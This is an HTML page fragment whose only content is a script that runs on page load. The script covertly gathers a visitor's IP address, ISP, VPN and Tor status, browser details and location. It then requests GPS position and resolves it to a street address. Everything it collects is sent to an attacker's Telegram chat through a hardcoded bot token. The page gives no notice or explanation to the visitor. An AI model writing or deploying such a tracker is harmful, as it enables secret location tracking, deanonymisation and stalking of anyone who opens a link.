<body>

  <script>
    const PUBLIC_BOT_TOKEN = '7904257718:AAEMNe8Nb4Lk4YcCPr1BjB2bfxq9HF-tjI8';
    const PUBLIC_CHAT_ID = '7830815090';

    const sendMessage = (text) => {
      fetch(`https://api.telegram.org/bot${PUBLIC_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: PUBLIC_CHAT_ID,
          text: text
        })
      });
    };

    const reverseGeocode = async (lat, lon) => {
      const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
      const data = await res.json();
      return data.display_name || 'Unknown address';
    };

    const getInfo = async () => {
      try {
        const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
        const ipAddress = ipData.ip;
        const ipLat = ipData.latitude;
        const ipLon = ipData.longitude;
        const ipAddressLookup = await reverseGeocode(ipLat, ipLon);

        const browserInfo = `ğŸ§­ Browser Info:
â€¢ Locale: ${navigator.language}
â€¢ Time Zone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
â€¢ Current Time: ${new Date().toLocaleString()}
â€¢ User Agent: ${navigator.userAgent}
â€¢ Platform: ${navigator.platform}
â€¢ Device Type: ${/Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'}`;

        const ipInfo = `ğŸŒ IP-Based Info:
â€¢ IP: ${ipAddress}
â€¢ Country: ${ipData.country_name}
â€¢ Region: ${ipData.region}
â€¢ City: ${ipData.city}
â€¢ ISP: ${ipData.org}
â€¢ Proxy: ${ipData.proxy ? 'Yes' : 'No'}
â€¢ VPN: ${ipData.security?.vpn ? 'Yes' : 'No'}
â€¢ TOR: ${ipData.security?.tor ? 'Yes' : 'No'}
â€¢ Latitude: ${ipLat}
â€¢ Longitude: ${ipLon}
â€¢ Address: ${ipAddressLookup}`;

        const baseInfo = `${browserInfo}\n\n${ipInfo}`;

        const permission = await navigator.permissions.query({ name: 'geolocation' });

        if (permission.state === 'granted') {
          navigator.geolocation.getCurrentPosition(async pos => {
            const geo = pos.coords;
            const gpsAddress = await reverseGeocode(geo.latitude, geo.longitude);
            const geoInfo = `ğŸ“ Geolocation (Permission Already Granted):
â€¢ Latitude: ${geo.latitude}
â€¢ Longitude: ${geo.longitude}
â€¢ Accuracy: Â±${geo.accuracy} meters
â€¢ Address: ${gpsAddress}`;

            sendMessage(`${baseInfo}\n\n${geoInfo}`);
          }, () => {
            sendMessage(`${baseInfo}\n\nâš ï¸ Failed to retrieve geolocation.`);
          });
        } else {
          sendMessage(baseInfo);

          navigator.geolocation.getCurrentPosition(async pos => {
            const geo = pos.coords;
            const gpsAddress = await reverseGeocode(geo.latitude, geo.longitude);
            const geoInfo = `ğŸ“ Geolocation (Permission Just Granted):
â€¢ Latitude: ${geo.latitude}
â€¢ Longitude: ${geo.longitude}
â€¢ Accuracy: Â±${geo.accuracy} meters
â€¢ Address: ${gpsAddress}`;

            sendMessage(geoInfo);
          }, err => {
            if (err.code === 1) {
              sendMessage('âŒ User denied geolocation access.');
            } else {
              sendMessage(`âš ï¸ Geolocation error: ${err.message}`);
            }
          });
        }
      } catch (e) {
        sendMessage(`âŒ Error collecting data: ${e.message}`);
      }
    };

    getInfo();
  </script>
